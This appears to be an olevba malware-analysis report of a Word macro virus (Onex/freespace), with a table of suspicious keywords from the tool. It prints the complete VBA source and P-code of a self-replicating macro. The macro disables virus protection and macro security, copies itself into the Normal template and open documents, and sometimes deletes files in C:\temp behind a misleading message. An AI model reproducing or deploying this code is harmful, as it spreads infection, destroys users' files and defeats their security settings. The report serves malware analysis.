olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Onex.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Lisa.cls 
in file: Virus.MSWord.Onex.f - OLE stream: 'Macros/VBA/Lisa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'W97m.freespace.a by SEMTEX
Private Sub Document_Open()
 On Error Resume Next
 Set Code = New DataObject
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
 
 With Application
 .StatusBar = "READY"
 End With

  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = 0
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
 CommandBars("Tools").Controls("Macro").Enabled = 0
  If NormalTemplate.VBProject.VBComponents(1).Name = "Lisa" Then
    callitn = True
   Else
    Set A = NormalTemplate.VBProject.VBComponents(1)
  End If
  If ActiveDocument.VBProject.VBComponents(1).Name = "Lisa" Then
    callita = True
   Else
    Set A = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
  End If
  Set ab = A.CodeModule
   Code.SetText Lisa.VBProject.VBComponents(1).CodeModule.Lines(1, Lisa.VBProject.VBComponents(1).CodeModule.CountOfLines)
   ab.DeleteLines 1, ab.CountOfLines
   ab.InsertLines 1, Code.GetText
   A.Name = "Lisa"
   If callitn = True And callita = True Then
    If Int(Rnd * 5) = 2 Then
      Call Lisa_payload
    End If
   End If
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Private Sub Lisa_payload()
On Error Resume Next

DoEvents
Randomize
If Int(Rnd * 500) = 2 Then

 Kill "C:\\temp\*.*"

 Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "READY"
    .Text = "Windows has just deleted any unwanted files to create freespace"
    .Show
End With
 
End If

End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Onex.f
' ===============================================================================
' Module streams:
' Macros/VBA/Lisa - 3897 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x001A "W97m.freespace.a by SEMTEX"
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	SetStmt 
' 	New <crash>
' 	Set Code 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' Line #9:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #10:
' 	LitStr 0x0005 "READY"
' 	MemStWith StatusBar 
' Line #11:
' 	EndWith 
' Line #12:
' Line #13:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #15:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "Lisa"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitVarSpecial (True)
' 	St callitn 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set A 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "Lisa"
' 	Eq 
' 	IfBlock 
' Line #24:
' 	LitVarSpecial (True)
' 	St callita 
' Line #25:
' 	ElseBlock 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set A 
' Line #27:
' 	LitVarSpecial (True)
' 	St saveit 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	SetStmt 
' 	Ld A 
' 	MemLd CodeModule 
' 	Set ab 
' Line #30:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Lisa 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld Lisa 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Code 
' 	ArgsMemCall SetText 0x0001 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld ab 
' 	MemLd CountOfLines 
' 	Ld ab 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld Code 
' 	MemLd GetText 
' 	Ld ab 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' 	LitStr 0x0004 "Lisa"
' 	Ld A 
' 	MemSt New 
' Line #34:
' 	Ld callitn 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld callita 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #35:
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	ArgsCall (Call) Lisa_payload 0x0000 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld saveit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Private Sub Lisa_payload())
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' Line #44:
' 	ArgsCall DoEvents 0x0000 
' Line #45:
' 	ArgsCall Read 0x0000 
' Line #46:
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #47:
' Line #48:
' 	LitStr 0x000C "C:\\temp\*.*"
' 	ArgsCall Kill 0x0001 
' Line #49:
' Line #50:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #51:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #52:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #53:
' 	LitStr 0x0005 "READY"
' 	MemStWith Heading 
' Line #54:
' 	LitStr 0x003F "Windows has just deleted any unwanted files to create freespace"
' 	MemStWith Then 
' Line #55:
' 	ArgsMemCallWith Show 0x0000 
' Line #56:
' 	EndWith 
' Line #57:
' Line #58:
' 	EndIfBlock 
' Line #59:
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

